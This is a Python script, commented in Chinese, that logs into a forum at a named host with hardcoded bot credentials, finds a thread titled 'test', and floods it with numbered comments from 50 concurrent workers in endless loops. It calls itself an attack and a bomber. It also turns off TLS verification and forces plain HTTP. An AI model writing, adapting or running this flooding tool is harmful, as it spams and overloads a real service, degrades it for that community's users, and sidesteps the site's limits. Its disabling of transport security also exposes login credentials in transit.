import requests
import json
import time
import threading
import urllib3
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from login import BBSTurkeyBotLogin

# 彻底禁用所有安全验证
os.environ['PYTHONHTTPSVERIFY'] = '0'
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TestSpamBot:
    def __init__(self, base_url, username, password):
        # 强制使用HTTP协议
        self.base_url = base_url.replace('https://', 'http://')
        self.username = username
        self.password = password
        
        # 创建超激进session配置
        self.session = requests.Session()
        self.session.verify = False
        self.session.trust_env = False  # 忽略系统代理设置
        
        # 调整适配器配置（兼容旧版requests）
        adapter = requests.adapters.HTTPAdapter(
            max_retries=5,
            pool_connections=100,
            pool_maxsize=100
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        self.token = None
        self.user_id = None
        self.target_thread_id = None
        self.comment_content = "phpbest"
        self.max_workers = 50  # 极限并发数

    def aggressive_request(self, method, url, **kwargs):
        """激进请求方法，绕过所有限制"""
        kwargs.update({
            'timeout': 3,
            'verify': False,
            'headers': kwargs.get('headers', {})
        })
        kwargs['headers'].update({
            'Connection': 'keep-alive',
            'Keep-Alive': '300',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        for _ in range(3):  # 自动重试3次
            try:
                return self.session.request(method, url, **kwargs)
            except:
                time.sleep(0.1)
        return None
    def login(self):
        """暴力登录方法"""
        print("🔥 正在暴力登录...")
        login_bot = BBSTurkeyBotLogin(
            self.base_url, 
            self.username, 
            self.password
        )
        login_bot.session = self.session  # 共享激进session
        
        for attempt in range(5):
            try:
                success, result, _ = login_bot.login_with_retry()
                if success:
                    self.token = result['data']['token']
                    self.user_id = result['data']['id']
                    print(f"💥 登录成功！Token: {self.token[:10]}...")
                    return True
            except Exception as e:
                print(f"💣 登录失败 {attempt+1}/5: {str(e)}")
                time.sleep(1)
        return False

    def find_test_thread(self):
        """查找test帖子（暴力版）"""
        try:
            response = self.aggressive_request(
                'GET',
                f"{self.base_url}/bbs/threads/list",
                params={'page_limit': 100}
            )
            
            if response and response.status_code == 200:
                for thread in response.json().get('data', []):
                    if 'test' in thread.get('title', '').lower():
                        self.target_thread_id = thread['id']
                        print(f"🎯 锁定目标帖子ID: {self.target_thread_id}")
                        return True
        except Exception as e:
            print(f"⚠️ 查找帖子异常: {str(e)}")
        return False

    def spam_attack(self):
        """极限评论攻击"""
        if not self.target_thread_id:
            return
            
        print("💣 启动极限评论攻击！")
        counter = 0
        
        def worker():
            nonlocal counter
            while True:
                try:
                    response = self.aggressive_request(
                        'POST',
                        f"{self.base_url}/bbs/posts/create",
                        json={
                            'thread_id': self.target_thread_id,
                            'content': f"{self.comment_content}_{counter}"
                        },
                        headers={'Authorization': self.token}
                    )
                    
                    if response and response.status_code == 200:
                        counter += 1
                        if counter % 10 == 0:
                            print(f"⚡ 已轰炸 {counter} 次")
                except:
                    pass

        # 启动50个并发worker
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(worker) for _ in range(self.max_workers)]
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n☠️ 攻击终止！总评论数: {counter}")

    def run(self):
        """执行攻击"""
        print("="*50)
        print("☠️ 终极Test帖子轰炸机")
        print("="*50)
        
        if self.login() and self.find_test_thread():
            self.spam_attack()

if __name__ == "__main__":
    BOT_CONFIG = {
        "base_url": "http://chess.free.mbbs.cc",  # 必须使用HTTP
        "username": "turkeybot", 
        "password": "passwordbotonly"
    }
    
    bot = TestSpamBot(**BOT_CONFIG)
    bot.run()


